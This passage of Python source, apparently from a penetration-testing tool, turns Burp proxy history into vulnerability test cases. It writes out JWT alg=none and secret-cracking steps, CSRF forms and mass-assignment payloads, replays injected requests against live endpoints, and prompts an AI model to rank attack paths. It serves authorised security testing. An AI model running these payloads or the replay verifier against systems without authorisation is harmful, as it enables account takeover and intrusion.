            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="jwt_attack",
            title='JWT — Algorithm Confusion / "none" / Weak Secret',
            description="JWTs are commonly misconfigured: accepting alg=none, using weak HMAC secrets, or RS256→HS256 algorithm confusion.",
            parameters=["Authorization"],
            payloads=(
                [f'alg="{v}" — strip/downgrade algorithm' for v in JWT_ALG_NONE_VARIANTS[:4]]
                + [f"Weak secret: {s}" for s in JWT_WEAK_SECRETS[:4]]
                + [f"kid injection: {k}" for k in JWT_KID_PAYLOADS[:2]]
            ),
            severity="high", priority=8,
            cwe="CWE-347", owasp="A02:2021 - Cryptographic Failures",
            rationale="JWT Bearer authentication detected on this endpoint.",
            steps=[
                "Decode the JWT at jwt.io — inspect header, payload, expiry",
                "Try algorithm=none: build <header_none>.<payload>. (empty signature)",
                "If RS256, try signing with the server's public key as HS256 HMAC secret",
                "Brute-force weak secret: hashcat -a 0 -m 16500 token.txt rockyou.txt",
                "Modify claims (role=admin, sub=admin_user) and re-sign / remove sig",
            ],
        ))

    if (profile.method in ("POST", "PUT", "DELETE", "PATCH") and "csrf" not in seen_vulns
            and not any("csrf" in c.lower() or "xsrf" in c.lower() for c in profile.cookies)):
        seen_vulns.add("csrf")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="csrf",
            title="Cross-Site Request Forgery (CSRF)",
            description="State-changing requests without CSRF tokens or SameSite cookies can be triggered cross-origin.",
            parameters=[],
            payloads=(
                [f"<form method='{profile.method}' action='{profile.full_url}'><input type='submit'></form>"]
                + [f"Bypass header: {h}" for h in CSRF_BYPASS_HEADERS[:4]]
            ),
            severity="medium", priority=6,
            cwe="CWE-352", owasp="A01:2021 - Broken Access Control",
            rationale=f"{profile.method} {profile.path} is state-changing. No CSRF token detected in parameters.",
            steps=[
                "Build an HTML form on a different origin pointing to this endpoint",
                "Submit it while the victim is authenticated — verify the action fires",
                "Check for missing SameSite cookie attribute (Lax/Strict blocks this)",
                "Test if removing Origin/Referer header is accepted",
                "For JSON APIs, try changing Content-Type to text/plain with a JSON body",
            ],
        ))

    if profile.is_json_api and profile.method in ("POST", "PUT", "PATCH") and "mass_assignment" not in seen_vulns:
        seen_vulns.add("mass_assignment")
        test_cases.append(TestCase(
            id=str(uuid.uuid4())[:8],
            endpoint=f"{profile.method} {profile.full_url}",
            method=profile.method,
            vuln_type="mass_assignment",
            title="Mass Assignment / Unauthorised Parameter Binding",
            description="JSON APIs that don't whitelist fields may accept extra keys like role, admin, or verified, escalating privileges.",
            parameters=list(profile.all_params)[:5],
            payloads=[json.dumps(f) for f in MASS_ASSIGNMENT_ROLE_FIELDS[:8]],
            severity="high", priority=7,
            cwe="CWE-915", owasp="A01:2021 - Broken Access Control",
            rationale=f"JSON body at {profile.method} {profile.path}. Extra keys may be bound by the framework.",
            steps=[
                'Add "role": "admin" to the existing JSON request body',
                'Try: "is_admin": true  "verified": true  "admin": 1',
                "Check /api-docs or /swagger for hidden/internal fields",
                "Observe if the response reflects injected values",
                "Check your account after the request — verify if privileges changed",
            ],
        ))

    return test_cases


# ─── Response analyser ────────────────────────────────────────────────────────

def analyse_responses(items: list[BurpItem]) -> list[dict]:
    """Scan response bodies for direct security indicators."""
    findings: list[dict] = []
    seen: set[str] = set()

    for item in items[:RESP_SCAN_LIMIT]:
        body = item.resp_body
        if not body:
            continue

        for indicator in _RESPONSE_INDICATORS:
            for pat in indicator["patterns"]:
                if re.search(pat, body, re.IGNORECASE | re.MULTILINE):
                    key = f"{indicator['name']}:{item.host}{_normalise_path(item.path)}"
                    if key in seen:
                        continue
                    seen.add(key)

                    # Extract a short snippet as evidence
                    m = re.search(pat, body, re.IGNORECASE)
                    snippet = body[max(0, m.start() - 40): m.end() + 80].strip() if m else ""

                    findings.append({
                        "type": "response_finding",
                        "title": indicator["title"],
                        "vuln": indicator["vuln"],
                        "severity": indicator["severity"],
                        "endpoint": f"{item.method} {item.url}",
                        "evidence": snippet[:200],
                        "description": f"Detected in response to {item.method} {item.path} (HTTP {item.status_code})",
                    })
                    break

    return findings


# ─── Tech stack + auth detection ─────────────────────────────────────────────

def detect_tech_stack(items: list[BurpItem]) -> list[str]:
    sample = "\n".join(
        (i.raw_request or "") + (i.raw_response[:2000] if i.raw_response else "")
        for i in items[:200]
    ).lower()
    return [tech for tech, signals in _TECH_SIGNALS.items()
            if any(s.lower() in sample for s in signals)]


def detect_auth_mechanisms(items: list[BurpItem]) -> list[str]:
    found: set[str] = set()
    for item in items:
        raw = item.raw_request or ""
        if "Authorization: Bearer eyJ" in raw:
            found.add("JWT Bearer Token")
        elif "Authorization: Bearer " in raw:
            found.add("Bearer Token")
        elif "Authorization: Basic " in raw:
            found.add("HTTP Basic Auth")
        for h in ("x-api-key", "api-key", "x-auth-token"):
            if h in item.req_headers:
                found.add("API Key Header")
        if item.cookies:
            found.add("Session Cookie")
    return list(found)


def find_interesting_endpoints(profiles: list[EndpointProfile]) -> list[dict]:
    interesting = []
    for profile in profiles:
        path_lower = profile.path.lower()
        for cls_name, cls_info in _EP_CLASSES.items():
            if any(pat in path_lower for pat in cls_info["patterns"]):
                interesting.append({
                    "endpoint": f"{profile.method} {profile.path}",
                    "full_url": profile.full_url,
                    "class": cls_name,
                    "auth_types": list(profile.auth_types),
                    "params": list(profile.all_params)[:8],
                    "priority": cls_info["boost"],
                })
                break

    interesting.sort(key=lambda x: -x["priority"])
    return interesting[:50]


# ─── Parameter correlation graph ─────────────────────────────────────────────

def build_param_graph(profiles: list[EndpointProfile]) -> list[dict]:
    """Map each parameter to every endpoint that uses it, scored by risk × coverage."""
    _HIGH_RISK = frozenset(
        p.lower() for p in
        list(IDOR_ID_PARAMS) + list(SQLI_TEST_PARAMS) + list(SSRF_PARAMS) + list(REDIRECT_PARAMS)
    )

    param_map: dict[str, list[dict]] = defaultdict(list)
    for profile in profiles:
        ep_entry = {
            "endpoint": f"{profile.method} {profile.path}",
            "full_url": profile.full_url,
            "method": profile.method,
            "auth": sorted(profile.auth_types),
        }
        for param in profile.all_params:
            param_map[param.lower()].append(ep_entry)

    correlations = []
    for param, endpoints in param_map.items():
        if len(endpoints) < 2:
            continue
        is_high_risk = param in _HIGH_RISK
        score = len(endpoints) * (3 if is_high_risk else 1)
        correlations.append({
            "param": param,
            "endpoint_count": len(endpoints),
            "endpoints": endpoints[:12],
            "is_high_risk": is_high_risk,
            "risk_score": score,
        })

    correlations.sort(key=lambda x: -x["risk_score"])
    return correlations[:30]


# ─── Auth flow tracer ─────────────────────────────────────────────────────────

_JWT_RE = re.compile(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}')
_LOGIN_PATTERNS = ["/login", "/signin", "/auth", "/token", "/session", "/oauth", "/jwt"]


def _decode_jwt_segment(seg: str) -> dict:
    try:
        seg += "=" * (4 - len(seg) % 4)
        return json.loads(base64.b64decode(seg).decode("utf-8", errors="replace"))
    except Exception:
        return {}


def trace_auth_flows(items: list[BurpItem], profiles: list[EndpointProfile]) -> dict:
    """Trace JWT issuance → usage and surface auth coverage gaps."""
    # 1. Find JWT-issuing endpoints
    token_flows: dict[str, dict] = {}

    for item in items:
        if item.method not in ("POST", "PUT") or item.status_code not in (200, 201):
            continue
        if not any(p in item.path.lower() for p in _LOGIN_PATTERNS):
            continue
        m = _JWT_RE.search(item.resp_body or "")
        if not m:
            continue

        token = m.group(0)
        prefix = token[:50]
        if prefix in token_flows:
            continue

        parts = token.split(".")
        header  = _decode_jwt_segment(parts[0]) if len(parts) > 0 else {}
        payload = _decode_jwt_segment(parts[1]) if len(parts) > 1 else {}

        token_flows[prefix] = {
            "token_preview": token[:25] + "…",
            "issuer_path":   item.path,
            "issuer_method": item.method,
            "alg":           header.get("alg", "unknown"),
            "claims":        {k: payload[k] for k in ("sub", "role", "exp", "iss", "admin", "is_admin") if k in payload},
            "usage_count":   0,
            "used_by":       [],
        }

    # 2. Count token usage
    for item in items:
        auth = item.req_headers.get("authorization", "")
        m = _JWT_RE.search(auth)
        if not m:
            continue
        prefix = m.group(0)[:50]
        if prefix in token_flows:
            token_flows[prefix]["usage_count"] += 1
            norm = _normalise_path(item.path)
            if norm not in token_flows[prefix]["used_by"]:
                token_flows[prefix]["used_by"].append(norm)

    for v in token_flows.values():
        v["used_by"] = v["used_by"][:15]

    # 3. Auth coverage gaps
    _SENSITIVE_KW = ["/user", "/account", "/profile", "/admin", "/order",
                     "/payment", "/invoice", "/settings", "/dashboard"]
    suspicious_unprotected: list[dict] = []
    protected_count   = 0
    unprotected_count = 0

    for profile in profiles:
        if profile.auth_types:
            protected_count += 1
        else:
            unprotected_count += 1
            if any(kw in profile.path.lower() for kw in _SENSITIVE_KW):
                suspicious_unprotected.append({
                    "endpoint": f"{profile.method} {profile.path}",
                    "full_url": profile.full_url,
                    "params":   sorted(profile.all_params)[:5],
                })

    # 4. JWT anomalies
    anomalies: list[dict] = []
    for info in token_flows.values():
        alg    = (info.get("alg") or "").upper()
        claims = info.get("claims", {})
        issuer = info.get("issuer_path", "")

        if alg in ("HS256", "HS384", "HS512"):
            anomalies.append({"type": "weak_algorithm", "severity": "high",
                              "detail": f"Symmetric HMAC signing ({alg}) — secret is brutable with hashcat",
                              "issuer": issuer})
        if alg in ("NONE", ""):
            anomalies.append({"type": "alg_none", "severity": "critical",
                              "detail": "Algorithm 'none' — signature verification may be bypassed",
                              "issuer": issuer})
        if "exp" not in claims:
            anomalies.append({"type": "no_expiry", "severity": "medium",
                              "detail": "JWT has no 'exp' claim — token never expires",
                              "issuer": issuer})
        if any(k in claims for k in ("role", "admin", "is_admin")):
            anomalies.append({"type": "role_in_payload", "severity": "high",
                              "detail": f"Authorization claims in JWT payload {list(claims.keys())} — modifiable if secret is weak",
                              "issuer": issuer})

    return {
        "token_flows":             list(token_flows.values())[:6],
        "protected_count":         protected_count,
        "unprotected_count":       unprotected_count,
        "suspicious_unprotected":  suspicious_unprotected[:12],
        "anomalies":               anomalies[:10],
    }


# ─── Active request verifier ──────────────────────────────────────────────────

async def verify_request(
    endpoint_str: str,
    method: str,
    vuln_type: str,
    param: str,
    payload: str,
    inject_in: str,
    body_params: dict,
    auth_headers: dict[str, str],
    original_status: int,
    req_timeout: int = 10,
    verify_ssl: bool = True,
) -> dict:
    """Replay a request with the payload injected and analyse the response."""
    try:
        import httpx
    except ImportError:
        return {"error": "httpx not installed", "verified": False}

    url = endpoint_str.split(" ", 1)[-1] if " " in endpoint_str else endpoint_str
    parsed = urlparse(url)

    headers: dict[str, str] = {
        "User-Agent": "AttackTrace-Verifier/1.0",
        "Accept":     "application/json, text/html, */*",
    }
    headers.update({k: v for k, v in auth_headers.items() if k and v})

    request_body: Optional[str] = None

    if inject_in == "query":
        qs = parse_qs(parsed.query)
        qs[param] = [payload]
        url = urlunparse(parsed._replace(query=urlencode({k: v[0] for k, v in qs.items()})))
    elif inject_in == "body_json":
        data = dict(body_params)
        data[param] = payload
        request_body = json.dumps(data)
        headers["Content-Type"] = "application/json"
    elif inject_in == "body_form":
        data = dict(body_params)
        data[param] = payload
        request_body = urlencode(data)
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    elif inject_in == "path":
        new_path = re.sub(r'\{[^}]+\}', payload, parsed.path)
        new_path = re.sub(r'(?<=/)\d+(?=/|$)', payload, new_path)
        url = urlunparse(parsed._replace(path=new_path))

    try:
        async with httpx.AsyncClient(verify=verify_ssl, follow_redirects=True,
                                     timeout=req_timeout) as client:
            resp = await client.request(
                method=method, url=url, headers=headers,
                content=request_body.encode() if request_body else None,
            )
        body  = resp.text[:4000]
        status = resp.status_code
    except Exception as exc:
        return {"verified": False, "confidence": "none", "error": str(exc),
                "status_code": 0, "response_snippet": "", "evidence": ""}

    verified   = False
    confidence = "low"
    evidence   = ""

    if vuln_type in ("sqli", "sqli_exposure"):
        _SQL = [r"you have an error in your sql syntax", r"ora-\d{5}:",
                r"microsoft ole db", r"sqlstate\[", r"warning: mysql_",
                r"sqlite3::", r"unclosed quotation mark", r"pg_query\(\)"]
        bl = body.lower()
        for pat in _SQL:
            m = re.search(pat, bl)
            if m:
                verified = True; confidence = "high"
                evidence = body[max(0, m.start()-30):m.end()+80]
                break

    elif vuln_type == "xss":
        if len(payload) > 5 and payload[:20].lower() in body.lower():
            verified = True; confidence = "high"
            idx = body.lower().find(payload[:20].lower())
            evidence = body[max(0, idx-40):idx+100]

    elif vuln_type == "ssti":
        for probe, expected in [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49")]:
            if probe.lower() in payload.lower() and expected in body:
                verified = True; confidence = "high"
                evidence = f"Template expression evaluated — '{expected}' found in response"
                break

    elif vuln_type in ("idor", "auth_bypass"):
        if status == 200 and original_status in (401, 403, 404):
            verified = True; confidence = "medium"
            evidence = f"HTTP {status} received (expected {original_status}) — possible access control bypass"
        else:
            evidence = f"HTTP {status} — manual review needed"

    elif vuln_type == "open_redirect":
        location = resp.headers.get("location", "")
        if location and any(kw in location for kw in ["evil.example", "attacker.", payload[:15]]):
            verified = True; confidence = "high"
            evidence = f"Redirect Location: {location}"

    elif vuln_type == "ssrf":
        if status == 200 and any(kw in body.lower() for kw in
                                  ["ami-id", "instance-id", "security-credentials",
                                   "-err wrong", "redis_version", "169.254"]):
            verified = True; confidence = "high"
            evidence = body[:200]

    elif vuln_type in ("info_disclosure", "secret_exposure"):
        for pat in [r"AKIA[0-9A-Z]{16}", r"-----BEGIN.*PRIVATE KEY",
                    r'"password"\s*:\s*"[^"]{4,}"']:
            m = re.search(pat, body, re.IGNORECASE)
            if m:
                verified = True; confidence = "high"
                evidence = body[max(0, m.start()-10):m.end()+30]
                break

    if not evidence:
        evidence = f"HTTP {status} — {len(body)} bytes received. Manual review needed."

    return {
        "verified":          verified,
        "confidence":        confidence,
        "status_code":       status,
        "response_snippet":  body[:500],
        "evidence":          evidence,
        "url_used":          url,
    }


# ─── History helpers ──────────────────────────────────────────────────────────

_UUID_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.IGNORECASE)


def _validate_uuid(value: str, label: str) -> str:
    if not _UUID_RE.match(value):
        raise ValueError(f"Invalid {label}: must be a UUID")
    return value


def _burp_history_dir(org_id: str) -> pathlib.Path:
    _validate_uuid(org_id, "org_id")
    base = pathlib.Path(_settings.ATTACKTRACE_WORKSPACE_DIR) / "burp-analyzer"
    d = base / org_id
    d.mkdir(parents=True, exist_ok=True)
    return d


def _safe_analysis_path(org_id: str, analysis_id: str) -> pathlib.Path:
    """Build and confine the analysis file path to the org's history directory."""
    _validate_uuid(analysis_id, "analysis_id")
    base = _burp_history_dir(org_id)
    candidate = (base / f"{analysis_id}.json").resolve()
    if not candidate.is_relative_to(base.resolve()):
        raise ValueError("Path traversal detected")
    return candidate


def _save_burp_analysis(
    org_id: str,
    filename: str,
    summary: dict,
    test_cases: list[dict],
    response_findings: list[dict],
    ai_text: str,
    param_graph: list[dict],
    auth_flows: dict,
) -> str:
    aid = str(uuid.uuid4())
    record = {
        "id": aid,
        "filename": filename,
        "saved_at": _time.time(),
        "summary": summary,
        "test_cases": test_cases,
        "response_findings": response_findings,
        "ai_text": ai_text,
        "param_graph": param_graph,
        "auth_flows": auth_flows,
    }
    _safe_analysis_path(org_id, aid).write_text(json.dumps(record))
    return aid


def _list_burp_history(org_id: str) -> list[dict]:
    d = _burp_history_dir(org_id)
    result = []
    for f in sorted(d.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)[:50]:
        try:
            data = json.loads(f.read_text())
            result.append({
                "id":               data["id"],
                "filename":         data.get("filename", "unknown"),
                "saved_at":         data.get("saved_at", 0),
                "total_requests":   data.get("summary", {}).get("total_requests", 0),
                "test_cases":       len(data.get("test_cases", [])),
                "response_findings":len(data.get("response_findings", [])),
                "severity_counts":  data.get("summary", {}).get("severity_counts", {}),
                "tech_stack":       data.get("summary", {}).get("tech_stack", []),
                "unique_hosts":     data.get("summary", {}).get("unique_hosts", []),
            })
        except Exception:
            continue
    return result


def _get_burp_analysis(org_id: str, analysis_id: str) -> Optional[dict]:
    try:
        f = _safe_analysis_path(org_id, analysis_id)
    except ValueError:
        return None
    if not f.exists():
        return None
    try:
        return json.loads(f.read_text())
    except Exception:
        return None


def _delete_burp_analysis(org_id: str, analysis_id: str) -> bool:
    try:
        f = _safe_analysis_path(org_id, analysis_id)
    except ValueError:
        return False
    if f.exists():
        f.unlink()
        return True
    return False


# ─── Claude AI prompt ─────────────────────────────────────────────────────────

def build_ai_prompt(
    items: list[BurpItem],
    profiles: list[EndpointProfile],
    tech_stack: list[str],
    auth_mechanisms: list[str],
    interesting: list[dict],
) -> str:
    hosts = list({i.host for i in items})[:5]

    top_endpoints = "\n".join(
        f"  {p.method:6} {p.path:<60} params: {', '.join(sorted(p.all_params)[:5]) or '-':30} auth: {', '.join(p.auth_types) or '-'}"
        for p in sorted(profiles, key=lambda x: -x.request_count)[:25]
    )

    high_priority = "\n".join(
        f"  [{ep['class'].upper():<12}] {ep['endpoint']:<50} params: {', '.join(ep['params'][:4]) or '-'}"
        for ep in interesting[:12]
    )

    return f"""You are a senior penetration tester analysing real HTTP traffic from a target web application.

APPLICATION OVERVIEW
  Hosts       : {', '.join(hosts)}
  Requests    : {len(items)} captured  |  Unique endpoints: {len(profiles)}
  Tech stack  : {', '.join(tech_stack) or 'unknown'}
  Auth        : {', '.join(auth_mechanisms) or 'none detected'}

TOP ENDPOINTS BY VOLUME
{top_endpoints}

HIGH-PRIORITY ENDPOINTS
{high_priority}

YOUR TASK — based ONLY on the actual traffic above, provide:

1. TOP 5 ATTACK PATHS — The highest-priority attack vectors for THIS application specifically. Reference exact endpoint paths and explain *why* they are high-priority for this target.

2. BUSINESS LOGIC RISKS — What does this application do? Where is the business logic breakable? Look for patterns like multi-step flows, value transfers, role changes, or approval workflows.

3. AUTH & SESSION ANALYSIS — Specific weaknesses in the authentication pattern observed. What should be tested first?

4. API SECURITY — If REST/GraphQL APIs exist, identify BOLA, mass assignment, broken function-level auth risks with exact endpoints.

5. QUICK WINS — 3-5 specific high-confidence tests to run first, ordered by likely impact.

Be specific and technical. Reference exact paths. Do not give generic OWASP advice — tailor everything to this target."""


# ─── Main streaming entry point ───────────────────────────────────────────────

def _sse(event: str, data: dict) -> str:
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"


async def run_burp_analysis(
    content: bytes,
    ai_analysis: bool,
    anthropic_api_key: str,
    base_url: str | None = None,
    model: str | None = None,
    org_id: str | None = None,
    filename: str = "burp_history.xml",
) -> AsyncGenerator[str, None]:
    """Full analysis pipeline — yields SSE events."""

    # 1. Parse
    try:
        items = parse_burp_xml(content)
    except ValueError as exc:
        yield _sse("error", {"message": str(exc)})
        return

    if not items:
        yield _sse("error", {"message": "No requests found. Export via: Proxy → HTTP history → Right-click → Save items."})
        return

    hosts = list({i.host for i in items})
    yield _sse("parsed", {
        "total_requests": len(items),
        "unique_hosts": hosts,
        "message": f"Parsed {len(items):,} requests from {len(hosts)} host(s)",
    })

    # 2. Profile
    profiles      = build_endpoint_profiles(items)
    tech_stack    = detect_tech_stack(items)
    auth_mechs    = detect_auth_mechanisms(items)
    interesting   = find_interesting_endpoints(profiles)

    yield _sse("profiled", {
        "unique_endpoints": len(profiles),
        "tech_stack": tech_stack,
        "auth_mechanisms": auth_mechs,
        "interesting_count": len(interesting),
        "message": f"Profiled {len(profiles):,} unique endpoints",
    })

    # 3. Response analysis (direct findings)
    response_findings = analyse_responses(items)
    for finding in response_findings:
        yield _sse("response_finding", finding)

    if response_findings:
        yield _sse("progress", {"message": f"Found {len(response_findings)} direct issue(s) in response bodies"})

    # 4. Test case generation
    all_test_cases: list[TestCase] = []

    for profile in sorted(profiles, key=lambda p: -p.request_count):
        tcs = generate_test_cases(profile)
        if tcs:
            all_test_cases.extend(tcs)
            yield _sse("test_cases", {
                "endpoint": f"{profile.method} {profile.path}",
                "cases": [tc.__dict__ for tc in tcs],
            })

    yield _sse("generation_complete", {
        "total_test_cases": len(all_test_cases),
        "interesting_endpoints": interesting,
        "message": f"Generated {len(all_test_cases):,} test cases across {len(profiles):,} endpoints",
    })

    # 5. Parameter correlation graph
    param_graph = build_param_graph(profiles)
    yield _sse("param_graph", {
        "correlations": param_graph,
        "message": f"Found {len(param_graph)} cross-endpoint parameter correlation(s)",
    })

    # 6. Auth flow tracing
    auth_flows = trace_auth_flows(items, profiles)
    yield _sse("auth_flows", {
        **auth_flows,
        "message": (
            f"Traced {len(auth_flows['token_flows'])} token flow(s), "
            f"{len(auth_flows['suspicious_unprotected'])} suspicious unprotected endpoint(s)"
        ),
    })

    # 7. AI analysis
    ai_text = ""
    if ai_analysis and anthropic_api_key:
        yield _sse("ai_start", {"message": "Running AI analysis — this may take 15-30 seconds…"})
        prompt = build_ai_prompt(items, profiles, tech_stack, auth_mechs, interesting)

        try:
            import anthropic  # type: ignore[import]
            effective_model = model or _settings.AI_MODEL
            client_kwargs: dict = {"api_key": anthropic_api_key}
            if base_url:
                client_kwargs["base_url"] = base_url
            client = anthropic.AsyncAnthropic(**client_kwargs)
            async with client.messages.stream(
                model=effective_model,
                max_tokens=2000,
                system="You are a senior penetration tester. Be specific, concise, and technical. Always reference exact endpoint paths from the data provided.",
                messages=[{"role": "user", "content": prompt}],
            ) as stream:
                async for chunk in stream.text_stream:
                    ai_text += chunk
                    yield _sse("ai_chunk", {"text": chunk})
        except Exception as exc:
            yield _sse("ai_error", {"message": f"AI analysis unavailable: {exc}"})

    # 8. Complete + save history
    sev_counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for tc in all_test_cases:
        sev_counts[tc.severity] = sev_counts.get(tc.severity, 0) + 1
    for rf in response_findings:
        sev_counts[rf["severity"]] = sev_counts.get(rf["severity"], 0) + 1

    summary = {
        "total_requests":      len(items),
        "unique_endpoints":    len(profiles),
        "test_cases":          len(all_test_cases),
        "response_findings":   len(response_findings),
        "severity_counts":     sev_counts,
        "tech_stack":          tech_stack,
        "auth_mechanisms":     auth_mechs,
        "unique_hosts":        hosts,
        "interesting_endpoints": interesting,
    }

    analysis_id: Optional[str] = None
    if org_id:
        try:
            analysis_id = _save_burp_analysis(
                org_id=org_id,
                filename=filename,
                summary=summary,
                test_cases=[tc.__dict__ for tc in all_test_cases],
                response_findings=response_findings,
                ai_text=ai_text,
                param_graph=param_graph,
                auth_flows=auth_flows,
            )
        except Exception:
            pass

    yield _sse("complete", {
        **summary,
        "analysis_id": analysis_id,
        "interesting_endpoints": interesting,
    })
